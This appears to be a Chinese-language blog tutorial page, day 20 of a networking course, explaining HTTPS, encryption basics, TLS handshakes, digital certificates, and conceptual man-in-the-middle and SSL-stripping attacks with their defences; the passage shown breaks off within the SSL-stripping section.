@@ -1,0 +1,1414 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="第20天：HTTPS和安全 今日目标 理解HTTPS的工作原理 掌握对称加密和非对称加密 学习TLS/SSL协议 了解数字证书和CA 理解HTTPS握手过程 学习常见Web安全攻击和防御 实现简单的HTTPS服务器 1. 为什么需要HTTPS？ 1.1 HTTP的安全问题 HTTP是明文传输：\n">
+<title>20天：HTTPS和安全</title>
+
+
+<link rel="canonical" href="https://zhiblin.github.io/p/20%E5%A4%A9https%E5%92%8C%E5%AE%89%E5%85%A8/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+
+
+<link rel="stylesheet" href="/scss/style.min.390cc81d180d80110703ea467e355a4f3a0f44f25d4e957842790824fb5f2ef2.css"><meta property='og:title' content="20天：HTTPS和安全">
+<meta property='og:description' content="第20天：HTTPS和安全 今日目标 理解HTTPS的工作原理 掌握对称加密和非对称加密 学习TLS/SSL协议 了解数字证书和CA 理解HTTPS握手过程 学习常见Web安全攻击和防御 实现简单的HTTPS服务器 1. 为什么需要HTTPS？ 1.1 HTTP的安全问题 HTTP是明文传输：\n">
+<meta property='og:url' content='https://zhiblin.github.io/p/20%E5%A4%A9https%E5%92%8C%E5%AE%89%E5%85%A8/'>
+<meta property='og:site_name' content='Diyouo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Network' /><meta property='article:tag' content='Book' /><meta property='article:tag' content='Python' /><meta property='article:published_time' content='2025-11-10T15:25:35&#43;00:00'/><meta property='article:modified_time' content='2025-11-10T15:25:35&#43;00:00'/>
+<meta name="twitter:title" content="20天：HTTPS和安全">
+<meta name="twitter:description" content="第20天：HTTPS和安全 今日目标 理解HTTPS的工作原理 掌握对称加密和非对称加密 学习TLS/SSL协议 了解数字证书和CA 理解HTTPS握手过程 学习常见Web安全攻击和防御 实现简单的HTTPS服务器 1. 为什么需要HTTPS？ 1.1 HTTP的安全问题 HTTP是明文传输：\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Diyouo</a></h1>
+            <h2 class="site-description">A clean blog</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav class="toc-nav" id="TableOfContents">
+                
+  <ul>
+    <li><a href="#今日目标">今日目标</a></li>
+    <li><a href="#1-为什么需要https">1. 为什么需要HTTPS？</a>
+      <ul>
+        <li><a href="#11-http的安全问题">1.1 HTTP的安全问题</a></li>
+        <li><a href="#12-https的解决方案">1.2 HTTPS的解决方案</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-加密基础">2. 加密基础</a>
+      <ul>
+        <li><a href="#21-对称加密">2.1 对称加密</a></li>
+        <li><a href="#22-非对称加密">2.2 非对称加密</a></li>
+        <li><a href="#23-哈希函数">2.3 哈希函数</a></li>
+        <li><a href="#24-数字签名">2.4 数字签名</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-tlsssl协议">3. TLS/SSL协议</a>
+      <ul>
+        <li><a href="#31-ssl-vs-tls">3.1 SSL vs TLS</a></li>
+        <li><a href="#32-tls协议栈">3.2 TLS协议栈</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-https握手过程">4. HTTPS握手过程</a>
+      <ul>
+        <li><a href="#41-tls-12-握手rsa">4.1 TLS 1.2 握手（RSA）</a></li>
+        <li><a href="#42-tls-13-握手优化">4.2 TLS 1.3 握手（优化）</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-数字证书">5. 数字证书</a>
+      <ul>
+        <li><a href="#51-什么是数字证书">5.1 什么是数字证书？</a></li>
+        <li><a href="#52-ca证书颁发机构">5.2 CA（证书颁发机构）</a></li>
+        <li><a href="#53-证书类型">5.3 证书类型</a></li>
+        <li><a href="#54-证书格式">5.4 证书格式</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-常见web安全攻击">6. 常见Web安全攻击</a>
+      <ul>
+        <li><a href="#61-中间人攻击mitm">6.1 中间人攻击（MITM）</a></li>
+        <li><a href="#62-ssl剥离攻击">6.2 SSL剥离攻击</a></li>
+        <li><a href="#63-证书欺诈">6.3 证书欺诈</a></li>
+        <li><a href="#64-其他攻击">6.4 其他攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-https最佳实践">7. HTTPS最佳实践</a>
+      <ul>
+        <li><a href="#71-服务器配置">7.1 服务器配置</a></li>
+        <li><a href="#72-安全头部">7.2 安全头部</a></li>
+        <li><a href="#73-证书管理">7.3 证书管理</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-实战项目https服务器">8. 实战项目：HTTPS服务器</a>
+      <ul>
+        <li><a href="#81-项目需求">8.1 项目需求</a></li>
+        <li><a href="#82-工具演示">8.2 工具演示</a></li>
+      </ul>
+    </li>
+    <li><a href="#9-今日练习">9. 今日练习</a>
+      <ul>
+        <li><a href="#练习1证书分析">练习1：证书分析</a></li>
+        <li><a href="#练习2抓包分析">练习2：抓包分析</a></li>
+        <li><a href="#练习3配置https">练习3：配置HTTPS</a></li>
+        <li><a href="#练习4安全测试">练习4：安全测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#10-常见问题">10. 常见问题</a></li>
+    <li><a href="#11-总结">11. 总结</a>
+      <ul>
+        <li><a href="#核心知识点">核心知识点</a></li>
+        <li><a href="#重点回顾">重点回顾</a></li>
+        <li><a href="#明天预告">明天预告</a></li>
+      </ul>
+    </li>
+  </ul>
+
+            </nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            
+            
+            
+            <a href="/categories/network/" style="background-color: hsl(45, 60%, 84%); color: hsl(45, 60%, 15%);">
+                Network
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/20%E5%A4%A9https%E5%92%8C%E5%AE%89%E5%85%A8/">20天：HTTPS和安全</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2025-11-10T15:25:35Z'>Monday, November 10, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+
+    
+</div>
+
+</header>
+
+    
+    <aside class="article-toc">
+        <details>
+            <summary>
+                <div class="article-toc-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6" /></svg>
+                    <span>Table of contents</span>
+                </div>
+            </summary>
+            <nav class="toc-nav">
+                
+  <ul>
+    <li><a href="#今日目标">今日目标</a></li>
+    <li><a href="#1-为什么需要https">1. 为什么需要HTTPS？</a>
+      <ul>
+        <li><a href="#11-http的安全问题">1.1 HTTP的安全问题</a></li>
+        <li><a href="#12-https的解决方案">1.2 HTTPS的解决方案</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-加密基础">2. 加密基础</a>
+      <ul>
+        <li><a href="#21-对称加密">2.1 对称加密</a></li>
+        <li><a href="#22-非对称加密">2.2 非对称加密</a></li>
+        <li><a href="#23-哈希函数">2.3 哈希函数</a></li>
+        <li><a href="#24-数字签名">2.4 数字签名</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-tlsssl协议">3. TLS/SSL协议</a>
+      <ul>
+        <li><a href="#31-ssl-vs-tls">3.1 SSL vs TLS</a></li>
+        <li><a href="#32-tls协议栈">3.2 TLS协议栈</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-https握手过程">4. HTTPS握手过程</a>
+      <ul>
+        <li><a href="#41-tls-12-握手rsa">4.1 TLS 1.2 握手（RSA）</a></li>
+        <li><a href="#42-tls-13-握手优化">4.2 TLS 1.3 握手（优化）</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-数字证书">5. 数字证书</a>
+      <ul>
+        <li><a href="#51-什么是数字证书">5.1 什么是数字证书？</a></li>
+        <li><a href="#52-ca证书颁发机构">5.2 CA（证书颁发机构）</a></li>
+        <li><a href="#53-证书类型">5.3 证书类型</a></li>
+        <li><a href="#54-证书格式">5.4 证书格式</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-常见web安全攻击">6. 常见Web安全攻击</a>
+      <ul>
+        <li><a href="#61-中间人攻击mitm">6.1 中间人攻击（MITM）</a></li>
+        <li><a href="#62-ssl剥离攻击">6.2 SSL剥离攻击</a></li>
+        <li><a href="#63-证书欺诈">6.3 证书欺诈</a></li>
+        <li><a href="#64-其他攻击">6.4 其他攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-https最佳实践">7. HTTPS最佳实践</a>
+      <ul>
+        <li><a href="#71-服务器配置">7.1 服务器配置</a></li>
+        <li><a href="#72-安全头部">7.2 安全头部</a></li>
+        <li><a href="#73-证书管理">7.3 证书管理</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-实战项目https服务器">8. 实战项目：HTTPS服务器</a>
+      <ul>
+        <li><a href="#81-项目需求">8.1 项目需求</a></li>
+        <li><a href="#82-工具演示">8.2 工具演示</a></li>
+      </ul>
+    </li>
+    <li><a href="#9-今日练习">9. 今日练习</a>
+      <ul>
+        <li><a href="#练习1证书分析">练习1：证书分析</a></li>
+        <li><a href="#练习2抓包分析">练习2：抓包分析</a></li>
+        <li><a href="#练习3配置https">练习3：配置HTTPS</a></li>
+        <li><a href="#练习4安全测试">练习4：安全测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#10-常见问题">10. 常见问题</a></li>
+    <li><a href="#11-总结">11. 总结</a>
+      <ul>
+        <li><a href="#核心知识点">核心知识点</a></li>
+        <li><a href="#重点回顾">重点回顾</a></li>
+        <li><a href="#明天预告">明天预告</a></li>
+      </ul>
+    </li>
+  </ul>
+
+            </nav>
+        </details>
+    </aside>
+    
+
+    <section class="article-content">
+    
+    
+    <h1 id="第20天https和安全">第20天：HTTPS和安全
+</h1><h2 id="今日目标">今日目标
+</h2><ul>
+<li>理解HTTPS的工作原理</li>
+<li>掌握对称加密和非对称加密</li>
+<li>学习TLS/SSL协议</li>
+<li>了解数字证书和CA</li>
+<li>理解HTTPS握手过程</li>
+<li>学习常见Web安全攻击和防御</li>
+<li>实现简单的HTTPS服务器</li>
+</ul>
+<hr>
+<h2 id="1-为什么需要https">1. 为什么需要HTTPS？
+</h2><h3 id="11-http的安全问题">1.1 HTTP的安全问题
+</h3><p><strong>HTTP是明文传输</strong>：</p>
+<pre tabindex="0"><code>问题场景：
+
+你在咖啡厅使用公共WiFi登录网站
+输入用户名：alice
+输入密码：mypassword123
+
+HTTP传输：
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{&#34;username&#34;:&#34;alice&#34;,&#34;password&#34;:&#34;mypassword123&#34;}
+
+危险：
+❌ 任何人都可以截获这个数据包
+❌ 密码被明文看到
+❌ 可以被篡改
+❌ 无法验证服务器身份
+</code></pre><p><strong>HTTP的三大安全威胁</strong>：</p>
+<pre tabindex="0"><code>1. 窃听（Eavesdropping）
+   - 攻击者截获数据包
+   - 读取敏感信息
+   - 密码、信用卡号等
+
+2. 篡改（Tampering）
+   - 中间人修改数据
+   - 注入恶意代码
+   - 篡改交易金额
+
+3. 冒充（Impersonation）
+   - 伪装成合法服务器
+   - 钓鱼攻击
+   - 盗取用户信息
+</code></pre><h3 id="12-https的解决方案">1.2 HTTPS的解决方案
+</h3><p><strong>HTTPS = HTTP + TLS/SSL</strong>：</p>
+<pre tabindex="0"><code>HTTPS的三大保证：
+
+1. 机密性（Confidentiality）
+   ✅ 加密传输
+   ✅ 无法窃听
+
+2. 完整性（Integrity）
+   ✅ 防止篡改
+   ✅ 数据验证
+
+3. 身份认证（Authentication）
+   ✅ 验证服务器身份
+   ✅ 防止冒充
+
+实现方式：
+- 对称加密：加密数据
+- 非对称加密：交换密钥
+- 数字证书：验证身份
+- 消息摘要：验证完整性
+</code></pre><hr>
+<h2 id="2-加密基础">2. 加密基础
+</h2><h3 id="21-对称加密">2.1 对称加密
+</h3><p><strong>概念</strong>：</p>
+<pre tabindex="0"><code>对称加密 = 加密和解密使用相同的密钥
+
+生活类比：
+保险箱：
+- 一把钥匙
+- 用它锁门
+- 用它开门
+
+Alice → Bob：
+1. Alice有密钥K
+2. Alice用K加密消息
+3. Bob用K解密消息
+4. 前提：Alice和Bob都知道K
+</code></pre><p><strong>常见算法</strong>：</p>
+<pre tabindex="0"><code>AES（Advanced Encryption Standard）
+- 最常用
+- 速度快
+- 安全性高
+- 密钥长度：128/192/256位
+
+DES（Data Encryption Standard）
+- 已被淘汰
+- 密钥太短（56位）
+- 不安全
+
+3DES（Triple DES）
+- DES的加强版
+- 使用三次DES
+- 逐渐被AES取代
+
+ChaCha20
+- 移动设备友好
+- Google推荐
+- 速度快
+</code></pre><p><strong>工作模式</strong>：</p>
+<pre tabindex="0"><code>ECB（Electronic Codebook）
+- 最简单
+- 不安全（相同明文→相同密文）
+- 不推荐
+
+CBC（Cipher Block Chaining）
+- 常用
+- 每个块依赖前一个块
+- 需要初始向量（IV）
+
+GCM（Galois/Counter Mode）
+- 推荐
+- 认证加密
+- TLS 1.3使用
+</code></pre><p><strong>对称加密的问题</strong>：</p>
+<pre tabindex="0"><code>密钥分发问题：
+
+Alice想和Bob通信：
+1. Alice生成密钥K
+2. 如何安全地把K传给Bob？
+   - 网络传输？不安全，会被截获
+   - 线下交换？不现实
+
+多人通信问题：
+n个人两两通信
+需要 n×(n-1)/2 个密钥
+100个人 → 4950个密钥 ❌
+</code></pre><h3 id="22-非对称加密">2.2 非对称加密
+</h3><p><strong>概念</strong>：</p>
+<pre tabindex="0"><code>非对称加密 = 公钥加密，私钥解密
+
+密钥对：
+- 公钥（Public Key）：公开的，任何人都可以用
+- 私钥（Private Key）：私密的，只有自己知道
+
+关系：
+- 公钥加密 → 私钥解密
+- 私钥加密 → 公钥解密
+
+生活类比：
+邮箱：
+- 邮箱口（公钥）：任何人都能投信
+- 邮箱钥匙（私钥）：只有主人能取信
+</code></pre><p><strong>RSA算法</strong>：</p>
+<pre tabindex="0"><code>RSA（Rivest-Shamir-Adleman）
+
+密钥生成：
+1. 选择两个大质数 p 和 q
+2. 计算 n = p × q
+3. 计算 φ(n) = (p-1) × (q-1)
+4. 选择 e（公钥指数），通常是 65537
+5. 计算 d（私钥指数），满足 e×d ≡ 1 (mod φ(n))
+
+公钥：(n, e)
+私钥：(n, d)
+
+加密：c = m^e mod n
+解密：m = c^d mod n
+
+密钥长度：
+- 1024位（不再安全）
+- 2048位（当前推荐）
+- 4096位（更安全，但慢）
+</code></pre><p><strong>使用场景</strong>：</p>
+<pre tabindex="0"><code>1. 数字签名
+   - 私钥签名
+   - 公钥验证
+   - 证明身份
+
+2. 密钥交换
+   - 用公钥加密对称密钥
+   - 私钥解密得到对称密钥
+   - 后续使用对称加密通信
+
+3. 数字证书
+   - CA用私钥签名证书
+   - 浏览器用公钥验证
+</code></pre><p><strong>非对称加密的问题</strong>：</p>
+<pre tabindex="0"><code>速度慢：
+- 比对称加密慢100-1000倍
+- 不适合加密大量数据
+
+解决方案（混合加密）：
+1. 非对称加密：交换对称密钥（只用一次）
+2. 对称加密：加密实际数据（快速）
+</code></pre><h3 id="23-哈希函数">2.3 哈希函数
+</h3><p><strong>概念</strong>：</p>
+<pre tabindex="0"><code>哈希函数 = 单向函数，不可逆
+
+特点：
+- 任意长度输入 → 固定长度输出
+- 相同输入 → 相同输出
+- 不同输入 → 几乎不可能相同输出
+- 无法从输出推导输入（单向）
+
+用途：
+- 验证数据完整性
+- 密码存储
+- 数字签名
+</code></pre><p><strong>常见算法</strong>：</p>
+<pre tabindex="0"><code>MD5（Message Digest 5）
+- 128位（16字节）
+- 已被破解
+- 不再安全
+- 只用于非安全场景（文件校验）
+
+SHA-1（Secure Hash Algorithm 1）
+- 160位（20字节）
+- 已被破解
+- Google已弃用
+
+SHA-2家族
+- SHA-224、SHA-256、SHA-384、SHA-512
+- 推荐使用SHA-256
+- 安全
+
+SHA-3
+- 最新标准
+- 更安全
+- 尚未广泛使用
+
+示例：
+输入：Hello World
+SHA-256：a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e
+</code></pre><h3 id="24-数字签名">2.4 数字签名
+</h3><p><strong>原理</strong>：</p>
+<pre tabindex="0"><code>数字签名 = 证明消息来自特定发送者
+
+步骤：
+1. Alice计算消息的哈希值
+2. Alice用私钥加密哈希值（签名）
+3. Alice发送：消息 + 签名
+
+验证：
+1. Bob收到：消息 + 签名
+2. Bob用Alice的公钥解密签名，得到哈希值H1
+3. Bob计算消息的哈希值H2
+4. 比较H1和H2
+   - 相同：签名有效
+   - 不同：被篡改或伪造
+
+作用：
+✅ 身份认证：确认发送者
+✅ 完整性：消息未被篡改
+✅ 不可否认：发送者无法否认
+</code></pre><hr>
+<h2 id="3-tlsssl协议">3. TLS/SSL协议
+</h2><h3 id="31-ssl-vs-tls">3.1 SSL vs TLS
+</h3><p><strong>历史</strong>：</p>
+<pre tabindex="0"><code>SSL（Secure Sockets Layer）
+- 1994: SSL 1.0（未发布）
+- 1995: SSL 2.0（有严重漏洞）
+- 1996: SSL 3.0
+
+TLS（Transport Layer Security）
+- 1999: TLS 1.0（基于SSL 3.0）
+- 2006: TLS 1.1
+- 2008: TLS 1.2（当前主流）
+- 2018: TLS 1.3（最新）
+
+关系：
+TLS是SSL的升级版
+习惯上仍称为SSL
+但实际上都是TLS
+</code></pre><p><strong>版本对比</strong>：</p>
+<pre tabindex="0"><code>┌──────────┬──────────┬──────────┬──────────┐
+│  版本    │   状态   │   安全性 │   性能   │
+├──────────┼──────────┼──────────┼──────────┤
+│ SSL 2.0  │   禁用   │    低    │    差    │
+│ SSL 3.0  │   禁用   │    低    │    差    │
+│ TLS 1.0  │   弃用   │    中    │    中    │
+│ TLS 1.1  │   弃用   │    中    │    中    │
+│ TLS 1.2  │  推荐    │    高    │    中    │
+│ TLS 1.3  │  最新    │   最高   │    高    │
+└──────────┴──────────┴──────────┴──────────┘
+
+推荐：
+只使用TLS 1.2和TLS 1.3
+禁用所有SSL和旧版TLS
+</code></pre><h3 id="32-tls协议栈">3.2 TLS协议栈
+</h3><p><strong>分层结构</strong>：</p>
+<pre tabindex="0"><code>┌─────────────────────────────────┐
+│        应用层（HTTP等）          │
+├─────────────────────────────────┤
+│      TLS Handshake Protocol     │  握手协议
+├─────────────────────────────────┤
+│   TLS Change Cipher Spec        │  切换密码协议
+├─────────────────────────────────┤
+│      TLS Alert Protocol         │  警报协议
+├─────────────────────────────────┤
+│      TLS Record Protocol        │  记录协议
+├─────────────────────────────────┤
+│           TCP                   │
+└─────────────────────────────────┘
+
+记录协议（Record Protocol）：
+- 分段、压缩、加密、认证
+- 传输加密数据
+
+握手协议（Handshake Protocol）：
+- 协商加密算法
+- 交换密钥
+- 验证身份
+</code></pre><hr>
+<h2 id="4-https握手过程">4. HTTPS握手过程
+</h2><h3 id="41-tls-12-握手rsa">4.1 TLS 1.2 握手（RSA）
+</h3><p><strong>完整流程</strong>：</p>
+<pre tabindex="0"><code>客户端                                  服务器
+
+1. ClientHello
+   ───────────────────────────────&gt;
+   - 支持的TLS版本
+   - 支持的加密套件
+   - 随机数（Client Random）
+
+2. ServerHello
+   &lt;───────────────────────────────
+   - 选择的TLS版本
+   - 选择的加密套件
+   - 随机数（Server Random）
+
+3. Certificate（证书）
+   &lt;───────────────────────────────
+   - 服务器的数字证书
+   - 包含公钥
+
+4. ServerHelloDone
+   &lt;───────────────────────────────
+
+5. 验证证书
+   - 检查证书有效性
+   - 验证CA签名
+   - 检查域名匹配
+
+6. ClientKeyExchange
+   ───────────────────────────────&gt;
+   - 生成预主密钥（Pre-Master Secret）
+   - 用服务器公钥加密
+   - 发送给服务器
+
+7. 双方计算
+   客户端和服务器都计算：
+   主密钥（Master Secret）= PRF(
+       Pre-Master Secret,
+       Client Random,
+       Server Random
+   )
+
+8. ChangeCipherSpec
+   ───────────────────────────────&gt;
+   - 通知：后续使用加密通信
+
+9. Finished（加密）
+   ───────────────────────────────&gt;
+   - 加密的握手消息摘要
+
+10. ChangeCipherSpec
+    &lt;───────────────────────────────
+
+11. Finished（加密）
+    &lt;───────────────────────────────
+
+12. 应用数据（加密）
+    &lt;══════════════════════════════&gt;
+
+握手完成！
+RTT（往返时间）：2-RTT
+</code></pre><p><strong>密钥推导</strong>：</p>
+<pre tabindex="0"><code>材料：
+- Client Random（客户端随机数）
+- Server Random（服务器随机数）
+- Pre-Master Secret（预主密钥，48字节）
+
+计算：
+Master Secret = PRF(
+    Pre-Master Secret,
+    &#34;master secret&#34;,
+    Client Random + Server Random
+)
+
+从Master Secret派生：
+- 客户端加密密钥
+- 服务器加密密钥
+- 客户端MAC密钥
+- 服务器MAC密钥
+- 客户端IV
+- 服务器IV
+</code></pre><h3 id="42-tls-13-握手优化">4.2 TLS 1.3 握手（优化）
+</h3><p><strong>改进</strong>：</p>
+<pre tabindex="0"><code>TLS 1.3的优化：
+
+1. 1-RTT握手
+   - TLS 1.2：2-RTT
+   - TLS 1.3：1-RTT
+   - 更快！
+
+2. 0-RTT恢复
+   - 会话恢复
+   - 直接发送数据
+   - 最快！
+
+3. 简化密码套件
+   - 移除不安全算法
+   - 只保留AEAD
+   - 更安全！
+
+流程：
+
+客户端                           服务器
+
+1. ClientHello + KeyShare
+   ───────────────────────────&gt;
+   - 支持的加密套件
+   - 密钥交换参数（猜测）
+   - 随机数
+
+2. ServerHello + KeyShare
+   + Certificate
+   + Finished
+   &lt;───────────────────────────
+   - 选择的加密套件
+   - 密钥交换参数
+   - 证书
+   - 完成
+
+3. Finished
+   ───────────────────────────&gt;
+
+4. 应用数据（加密）
+   &lt;═══════════════════════════&gt;
+
+握手完成！
+RTT：1-RTT（快一倍）
+</code></pre><hr>
+<h2 id="5-数字证书">5. 数字证书
+</h2><h3 id="51-什么是数字证书">5.1 什么是数字证书？
+</h3><p><strong>证书 = 服务器的身份证</strong>：</p>
+<pre tabindex="0"><code>数字证书包含：
+- 域名（example.com）
+- 公钥
+- 证书颁发机构（CA）
+- 有效期
+- CA的数字签名
+
+作用：
+证明&#34;这个公钥确实属于example.com&#34;
+
+生活类比：
+身份证：
+- 照片
+- 姓名
+- 身份证号
+- 公安局盖章
+
+数字证书：
+- 公钥
+- 域名
+- 序列号
+- CA签名
+</code></pre><h3 id="52-ca证书颁发机构">5.2 CA（证书颁发机构）
+</h3><p><strong>信任链</strong>：</p>
+<pre tabindex="0"><code>证书信任链：
+
+根CA（Root CA）
+  └─ 中间CA（Intermediate CA）
+      └─ 网站证书（End-entity Certificate）
+
+示例：
+DigiCert Root CA
+  └─ DigiCert SHA2 Secure Server CA
+      └─ example.com
+
+验证过程：
+1. 浏览器收到example.com证书
+2. 验证example.com证书的签名（用中间CA公钥）
+3. 验证中间CA证书的签名（用根CA公钥）
+4. 检查根CA是否在信任列表中
+
+根CA：
+- 预装在操作系统/浏览器中
+- 数量有限（约200个）
+- 高度可信
+</code></pre><p><strong>著名CA</strong>：</p>
+<pre tabindex="0"><code>商业CA：
+- DigiCert
+- GlobalSign
+- GoDaddy
+- Comodo（现在叫Sectigo）
+
+免费CA：
+- Let&#39;s Encrypt（最流行）
+- ZeroSSL
+- Cloudflare
+
+自签名证书：
+- 自己给自己签名
+- 不被信任
+- 只用于测试
+</code></pre><h3 id="53-证书类型">5.3 证书类型
+</h3><pre tabindex="0"><code>按验证级别：
+
+1. DV（Domain Validation）
+   - 域名验证
+   - 最基础
+   - 验证：拥有域名控制权
+   - 用途：个人网站、博客
+   - 价格：免费/便宜
+
+2. OV（Organization Validation）
+   - 组织验证
+   - 中等
+   - 验证：域名 + 组织真实性
+   - 用途：企业网站
+   - 价格：中等
+
+3. EV（Extended Validation）
+   - 扩展验证
+   - 最高级
+   - 验证：严格的组织审查
+   - 显示：绿色地址栏（旧版浏览器）
+   - 用途：银行、电商
+   - 价格：昂贵
+
+按覆盖范围：
+
+1. 单域名证书
+   example.com ✅
+   www.example.com ❌
+
+2. 通配符证书
+   example.com ✅
+   www.example.com ✅
+   api.example.com ✅
+   *.example.com ✅
+
+3. 多域名证书（SAN）
+   example.com ✅
+   example.net ✅
+   example.org ✅
+</code></pre><h3 id="54-证书格式">5.4 证书格式
+</h3><pre tabindex="0"><code>PEM（Privacy Enhanced Mail）
+- 最常用
+- Base64编码
+- 文本格式
+- 扩展名：.pem, .crt, .cer, .key
+
+示例：
+-----BEGIN CERTIFICATE-----
+MIIDXTCCAkWgAwIBAgIJAKL0UG+mRbSjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
+...
+-----END CERTIFICATE-----
+
+DER（Distinguished Encoding Rules）
+- 二进制格式
+- 扩展名：.der, .cer
+
+PKCS#12 / PFX
+- 包含证书和私钥
+- 有密码保护
+- 扩展名：.p12, .pfx
+- 用于导入/导出
+
+证书链文件：
+- 包含多个证书
+- 从网站证书到根CA
+- fullchain.pem
+</code></pre><hr>
+<h2 id="6-常见web安全攻击">6. 常见Web安全攻击
+</h2><h3 id="61-中间人攻击mitm">6.1 中间人攻击（MITM）
+</h3><pre tabindex="0"><code>攻击场景：
+
+正常通信：
+客户端 ←───────────→ 服务器
+
+中间人攻击：
+客户端 ←─→ 攻击者 ←─→ 服务器
+         （冒充）
+
+攻击步骤：
+1. 客户端请求连接服务器
+2. 攻击者截获请求
+3. 攻击者连接服务器
+4. 攻击者冒充服务器与客户端通信
+5. 攻击者窃听/篡改数据
+
+防御：
+✅ 使用HTTPS
+✅ 验证证书
+✅ 证书固定（Certificate Pinning）
+✅ HSTS（强制HTTPS）
+</code></pre><h3 id="62-ssl剥离攻击">6.2 SSL剥离攻击
+</h3><pre tabindex="0"><code>攻击原理：
+将HTTPS降级为HTTP
+
+攻击步骤：
+1. 用户访问 http://bank.com
+2. 服务器重定向 https://bank.com
+3. 攻击者截获重定向
